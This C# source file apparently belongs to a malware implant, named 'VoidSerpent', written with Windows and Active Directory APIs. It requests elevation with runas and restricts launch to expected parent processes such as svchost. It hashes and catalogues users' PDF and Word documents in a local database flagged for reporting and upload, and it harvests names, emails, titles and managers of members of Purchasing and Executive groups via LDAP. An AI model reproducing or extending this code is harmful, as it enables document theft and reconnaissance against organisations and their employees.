using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Data.SQLite;
using System.Runtime.InteropServices;
using System.DirectoryServices;
using System.Linq.Expressions;
using System.DirectoryServices.ActiveDirectory;


namespace VoidSerpent
{
    public static class DanceUponDeadMinds
    {
        public static void RunCmd(string process, string args, bool shell)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = $"\"{process}\"",
                Arguments = args,
                UseShellExecute = shell
            };
            try
            {
                Process.Start(startInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to request elevation: " + ex.Message);
            }
        }
    }
    
    public static class BetrayalIsASymptom
    {

        private static Mutex mutex = null;
        public static bool IsUserAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void RequestElevation(string applicationPath, string[] arguments)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = $"\"{applicationPath}\"",
                Arguments = string.Join(" ", arguments),
                Verb = "runas",
                UseShellExecute = true
            };
            try
            {
                Process.Start(startInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to request elevation: " + ex.Message);
            }
        }

        static Process GetParentProcess(Process process)
        {
            try
            {
                int parentPid = 0;
                using (var query = new ManagementObjectSearcher($"SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = {process.Id}"))
                {
                    foreach (var item in query.Get())
                    {
                        parentPid = Convert.ToInt32(item["ParentProcessId"]);
                        break;
                    }
                }
                return parentPid > 0 ? Process.GetProcessById(parentPid) : null;
            }
            catch (Exception)
            {
                return null; // parent process Id not found
            }
        }

        public static bool protectedStart()
        {
            bool safe = true;

            // Protect startup to control who launches
            Process cProc = Process.GetCurrentProcess();
            Process pProc = GetParentProcess(cProc);
            string[] authorizedParents = { "powershell", "taskhostw", "svchost", "taskhost", "taskeng" };
            if (!authorizedParents.Contains(pProc.ProcessName))
            {
                safe = false;
            }

            // Ensure only one instance is running
            string mtx = "beavup";
            bool createdNew;
            mutex = new Mutex(true, mtx, out createdNew);
            if (!createdNew) // another instance is running
            {
                safe = false;
            }

            return safe;
        }
    }

    public static class ToWakeAndAvengeTheDead
    {
        public static HostInfo GetHostInfo()
        {
            string ComputerName = Environment.GetEnvironmentVariable("COMPUTERNAME");
            string UserName = Environment.GetEnvironmentVariable("USERNAME");
            return new HostInfo(ComputerName, UserName);
        }

        public class HostInfo
        {
            public string ComputerName { get; set; }
            public string UserName { get; set; }

            public HostInfo(string computerName, string userName)
            {
                ComputerName = computerName;
                UserName = userName;
            }
        }

        public static List<(string Path, string Sha1Hash)> EnumerateFiles()
        {
            // Get the user's Documents and Downloads folders
            string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string downloadsPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");

            // Define the file extensions we're interested in
            List<string> validExtensions = new List<string>
            {
                ".pdf",
                ".doc",
                ".docx"
            };

            // Create a list to store the results
            List<(string Path, string Sha1Hash)> result = new List<(string Path, string Sha1Hash)>();

            // Helper function to add files from a directory to the result list
            void AddFilesFromDirectory(string directoryPath)
            {
                try
                {
                    foreach (string file in Directory.GetFiles(directoryPath))
                    {
                        var fileInfo = new FileInfo(file);
                        if (validExtensions.Contains(fileInfo.Extension.ToLower()))
                        {
                            string sha1Hash = GetFileSha1Hash(file);
                            result.Add((file, sha1Hash));
                        }
                    }

                    // Recursively add files from subdirectories
                    foreach (string subdir in Directory.GetDirectories(directoryPath))
                    {
                        AddFilesFromDirectory(subdir);
                    }
                }
                catch {}
            }

            // Add files from the Documents folder
            AddFilesFromDirectory(documentsPath);

            // Add files from the Downloads folder
            AddFilesFromDirectory(downloadsPath);

            return result;
        }

        public static string GetFileSha1Hash(string filePath)
        {
            using (SHA1 sha1 = SHA1.Create())
            {
                byte[] fileBytes = File.ReadAllBytes(filePath);
                byte[] hashBytes = sha1.ComputeHash(fileBytes);

                // Convert the byte array to a hexadecimal string
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    builder.Append(hashBytes[i].ToString("x2"));
                }

                return builder.ToString();
            }
        }
    }

    // Database work
    public class DatabaseManager
    {
        private string _databasePath;
        private SQLiteConnection _connection;

        public DatabaseManager(string databasePath)
        {
            _databasePath = databasePath;
            InitializeDatabase();
        }

        private void InitializeDatabase()
        {
            if (!File.Exists(_databasePath))
            {
                var connectionStringBuilder = new SQLiteConnectionStringBuilder
                {
                    DataSource = _databasePath
                };

                using (var connection = new SQLiteConnection(connectionStringBuilder.ConnectionString))
                {
                    connection.Open();
                    CreateTables(connection);
                }
            }
        }

        private void CreateTables(SQLiteConnection connection)
        {
            string directoryTableQuery = @"
                CREATE TABLE IF NOT EXISTS directory (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL,
                    name TEXT NOT NULL,
                    email TEXT NOT NULL,
                    title TEXT NOT NULL,
                    department TEXT NOT NULL,
                    manager TEXT NOT NULL
                );";

            string filesTableQuery = @"
                CREATE TABLE IF NOT EXISTS files (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL,
                    path TEXT NOT NULL,
                    sha1 TEXT NOT NULL,
                    reported BOOLEAN NOT NULL DEFAULT 0,
                    uploaded BOOLEAN NOT NULL DEFAULT 0
                );";

            string jobsTableQuery = @"
                CREATE TABLE IF NOT EXISTS jobs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL,
                    status TEXT NOT NULL,
                    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
                );";

            using (var command = new SQLiteCommand(connection))
            {
                command.CommandText = directoryTableQuery;
                command.ExecuteNonQuery();

                command.CommandText = filesTableQuery;
                command.ExecuteNonQuery();

                command.CommandText = jobsTableQuery;
                command.ExecuteNonQuery();
            }
        }

        public void DirectoryEntry(string username, string name, string email, string title, string department, string manager)
        {
            using (var connection = new SQLiteConnection(GetConnectionString()))
            {
                connection.Open();
                var query = @"
                    INSERT OR REPLACE INTO directory (
                        id,
                        username,
                        name,
                        email,
                        title,
                        department,
                        manager
                    ) VALUES (
                        (SELECT id FROM directory WHERE username = @username),
                        @username,
                        @name,
                        @email,
                        @title,
                        @department,
                        @manager
                    );";

                using (var command = new SQLiteCommand(query, connection))
                {
                    command.Parameters.AddWithValue("@username", username);
                    command.Parameters.AddWithValue("@name", name);
                    command.Parameters.AddWithValue("@email", email);
                    command.Parameters.AddWithValue("@title", title);
                    command.Parameters.AddWithValue("@department", department);
                    command.Parameters.AddWithValue("@manager", manager);

                    command.ExecuteNonQuery();
                }
            }
        }

        public void FileEntry(string name, string path, string sha1, bool reported = false, bool uploaded = false)
        {
            using (var connection = new SQLiteConnection(GetConnectionString()))
            {
                connection.Open();
                var query = @"
                    INSERT OR REPLACE INTO files (
                        id,
                        name,
                        path,
                        sha1,
                        reported,
                        uploaded
                    ) VALUES (
                        (SELECT id FROM files WHERE sha1 = @sha1),
                        @name,
                        @path,
                        @sha1,
                        @reported,
                        @uploaded
                    );";

                using (var command = new SQLiteCommand(query, connection))
                {
                    command.Parameters.AddWithValue("@name", name);
                    command.Parameters.AddWithValue("@path", path);
                    command.Parameters.AddWithValue("@sha1", sha1);
                    command.Parameters.AddWithValue("@reported", reported ? 1 : 0);
                    command.Parameters.AddWithValue("@uploaded", uploaded ? 1 : 0);

                    command.ExecuteNonQuery();
                }
            }
        }

        public List<Dictionary<string, object>> PendingFiles()
        {
            var entries = new List<Dictionary<string, object>>();

            using (var connection = new SQLiteConnection(GetConnectionString()))
            {
                connection.Open();
                var query = @"
            SELECT id, name, path, sha1, reported, uploaded
            FROM files
            WHERE reported = 0;";

                using (var command = new SQLiteCommand(query, connection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var entry = new Dictionary<string, object>
                    {
                        { "id", reader["id"] },
                        { "name", reader["name"] },
                        { "path", reader["path"] },
                        { "sha1", reader["sha1"] },
                        { "reported", Convert.ToBoolean(reader["reported"]) },
                        { "uploaded", Convert.ToBoolean(reader["uploaded"]) }
                    };
                            entries.Add(entry);
                        }
                    }
                }
            }

            return entries;
        }

        public void MarkFileAsReported(string sha1)
        {
            using (var connection = new SQLiteConnection(GetConnectionString()))
            {
                connection.Open();
                var query = @"
            UPDATE files
            SET reported = 1
            WHERE sha1 = @sha1;";

                using (var command = new SQLiteCommand(query, connection))
                {
                    command.Parameters.AddWithValue("@sha1", sha1);

                    command.ExecuteNonQuery();
                }
            }
        }

        public bool IsHashInDatabase(string sha1)
        {
            using (var connection = new SQLiteConnection(GetConnectionString()))
            {
                connection.Open();
                var query = "SELECT COUNT(*) FROM files WHERE sha1 = @sha1;";

                using (var command = new SQLiteCommand(query, connection))
                {
                    command.Parameters.AddWithValue("@sha1", sha1);

                    int count = Convert.ToInt32(command.ExecuteScalar());
                    return count > 0;
                }
            }
        }

        public void JobEntry(string name, string status)
        {
            using (var connection = new SQLiteConnection(GetConnectionString()))
            {
                connection.Open();
                var query = @"
                    INSERT OR REPLACE INTO jobs (
                        id,
                        name,
                        status
                    ) VALUES (
                        (SELECT id FROM jobs WHERE name = @name),
                        @name,
                        @status
                    );";

                using (var command = new SQLiteCommand(query, connection))
                {
                    command.Parameters.AddWithValue("@name", name);
                    command.Parameters.AddWithValue("@status", status);

                    command.ExecuteNonQuery();
                }
            }
        }

        public string GetJobStatus(string jobName)
        {
            try
            {
                using (var connection = new SQLiteConnection(GetConnectionString()))
                {
                    connection.Open();
                    var query = @"SELECT status FROM jobs WHERE name = @jobName";

                    using (var command = new SQLiteCommand(query, connection))
                    {
                        command.Parameters.AddWithValue("@jobName", jobName);

                        using (var reader = command.ExecuteReader())
                        {
                            if (reader.Read())
                            {
                                return reader.GetString(0);
                            }
                        }
                    }
                }
            }
            catch
            {
                // Log the exception or handle it as needed
                Console.WriteLine("An error occurred while fetching job status.");
            }

            // Return a default value or throw an exception
            return "pending"; // or throw new Exception("Job not found");
        }

        public List<string> GetJobs()
        {
            var jobNames = new List<string>();

            using (var connection = new SQLiteConnection(GetConnectionString()))
            {
                connection.Open();
                var query = "SELECT name FROM jobs;";

                using (var command = new SQLiteCommand(query, connection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            jobNames.Add(reader.GetString(0));
                        }
                    }
                }
            }

            return jobNames;
        }

        private string GetConnectionString()
        {
            var connectionStringBuilder = new SQLiteConnectionStringBuilder
            {
                DataSource = _databasePath
            };

            return connectionStringBuilder.ConnectionString;
        }
    }

    public class DirectoryHelper
    {
        // Constants from lmerr.h
        private const int NERR_Success = 0;
        private const int ERROR_NOT_ENOUGH_MEMORY = 8;
        private const int ERROR_INVALID_PARAMETER = 87;
        private const int ERROR_NO_BROWSER_SERVERS_FOUND = 6118;

        // Structures and enums from lmsname.h
        private enum NetJoinStatus
        {
            NetSetupUnknown,
            NetSetupMemberServer,
            NetSetupStandAlone,
            NetSetupWorkgroup,
            NetSetupDomainBDC,
            NetSetupDomainPrimary
        }

        [DllImport("Netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int NetGetJoinInformation(
            string serverName,
            out IntPtr domainName,
            out NetJoinStatus joinStatus);

        [DllImport("Netapi32.dll")]
        private static extern int NetApiBufferFree(IntPtr buffer);

        public class UserInfo
        {
            public string UserName { get; set; }
            public string Name { get; set; }
            public string Email { get; set; }
            public string Title { get; set; }
            public string Department { get; set; }
            public string Manager { get; set; }


            public UserInfo(string username, string name, string email, string title, string department, string manager)
            {

                UserName = username;
                Name = name;
                Email = email;
                Title = title;
                Department = department;
                Manager = manager;
            }

        }

        public static UserInfo GetUserInfo()
        {
            IntPtr domainNamePtr;
            NetJoinStatus joinStatus;

            int result = NetGetJoinInformation(null, out domainNamePtr, out joinStatus);

            if (result == NERR_Success)
            {
                try
                {
                    string dnsdomain = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
                    string username = Environment.GetEnvironmentVariable("USERNAME");
                    string[] splitdomain = dnsdomain.Split('.');
                    string searchBase = $"DC={splitdomain[0]},DC={splitdomain[1]}";

                    try
                    {
                        // Construct the LDAP path to query Active Directory
                        string ldapPath = $"LDAP://{searchBase}";

                        using (DirectoryEntry root = new DirectoryEntry(ldapPath))
                        using (DirectorySearcher searcher = new DirectorySearcher(root))
                        {
                            // Set the filter to find the current user
                            searcher.Filter = $"(&(objectClass=user)(sAMAccountName={Environment.GetEnvironmentVariable("USERNAME")}))";
                            searcher.PropertiesToLoad.Add("displayName");
                            searcher.PropertiesToLoad.Add("mail");
                            searcher.PropertiesToLoad.Add("description");
                            searcher.PropertiesToLoad.Add("department");
                            searcher.PropertiesToLoad.Add("manager");

                            // Execute the search
                            SearchResult resultUser = searcher.FindOne();

                            // Free the allocated buffer
                            NetApiBufferFree(domainNamePtr);

                            if (resultUser != null)
                            {
                                UserInfo data = new UserInfo(
                                    username: username,
                                    name: resultUser.Properties["displayName"][0].ToString(),
                                    email: resultUser.Properties.Contains("mail") ? resultUser.Properties["mail"][0].ToString() : string.Empty,
                                    title: resultUser.Properties.Contains("title") ? resultUser.Properties["title"][0].ToString() : string.Empty,
                                    department: resultUser.Properties.Contains("department") ? resultUser.Properties["department"][0].ToString() : string.Empty,
                                    manager: resultUser.Properties.Contains("manager") ? resultUser.Properties["manager"][0].ToString() : string.Empty
                                );

                                return data;
                            }
                            else
                            {
                                //Console.WriteLine("No user found in Active Directory.");
                                return null;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error accessing Active Directory: {ex.Message}");
                        return null;
                    }
                }
                catch (Exception)
                {
                    // Console.WriteLine($"Not domain joined.");
                    return null;
                }
            }
            else
            {
                return null;
            }
        }

        public static void SoStrangeIRememberYou()
        {
            var db = new DatabaseManager("syncstate.db");
            string[] keywords = { "Purchasing", "Executive" };
            IntPtr domainNamePtr;
            NetJoinStatus joinStatus;

            // Get the domain name of the computer
            int result = NetGetJoinInformation(null, out domainNamePtr, out joinStatus);

            if (result == NERR_Success)
            {
                try
                {
                    string dnsdomain = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
                    string username = Environment.GetEnvironmentVariable("USERNAME");
                    string[] splitdomain = dnsdomain.Split('.');
                    string searchBase = $"DC={splitdomain[0]},DC={splitdomain[1]}";

                    try
                    {
                        // Construct the LDAP path to query Active Directory
                        string ldapPath = $"LDAP://{searchBase}";
                        using (DirectoryEntry entry = new DirectoryEntry(ldapPath))
                        using (DirectorySearcher searcher = new DirectorySearcher(entry))
                        {
                            // Filter to find groups with any of the specified keywords in their name
                            searcher.Filter = "(objectClass=group)";
                            searcher.PropertiesToLoad.Add("name");

                            // Find all matching groups
                            foreach (SearchResult groupResult in searcher.FindAll())
                            {
                                string groupName = groupResult.Properties["name"][0].ToString();

                                // Check if the group name contains any of the keywords
                                bool isMatch = false;
                                foreach (var keyword in keywords)
                                {
                                    if (groupName.Contains(keyword))
                                    {
                                        isMatch = true;
                                        break;
                                    }
                                }

                                if (isMatch)
                                {
                                    Console.WriteLine($"Found group: {groupName}");

                                    using (DirectoryEntry groupEntry = new DirectoryEntry(groupResult.Path))
                                    using (DirectorySearcher memberSearcher = new DirectorySearcher(groupEntry))
                                    {
                                        memberSearcher.Filter = "(objectClass=user)";
                                        searcher.PropertiesToLoad.Add("displayName");
                                        searcher.PropertiesToLoad.Add("mail");
                                        searcher.PropertiesToLoad.Add("description");
                                        searcher.PropertiesToLoad.Add("department");
                                        searcher.PropertiesToLoad.Add("manager");

                                        foreach (SearchResult memberResult in memberSearcher.FindAll())
                                        {
                                            UserInfo data = new UserInfo(
                                                username: username,
                                                name: memberResult.Properties["displayName"][0].ToString(),
                                                email: memberResult.Properties.Contains("mail") ? memberResult.Properties["mail"][0].ToString() : string.Empty,
                                                title: memberResult.Properties.Contains("title") ? memberResult.Properties["title"][0].ToString() : string.Empty,
                                                department: memberResult.Properties.Contains("department") ? memberResult.Properties["department"][0].ToString() : string.Empty,
                                                manager: memberResult.Properties.Contains("manager") ? memberResult.Properties["manager"][0].ToString() : string.Empty
                                            );
                                            db.DirectoryEntry(data.UserName, data.Name, data.Email, data.Title, data.Department, data.Manager);
                                        }
                                    }
                                }
                            }
                        }
                    }
                    catch { }
                }
                catch { }
            }
        }
    }
}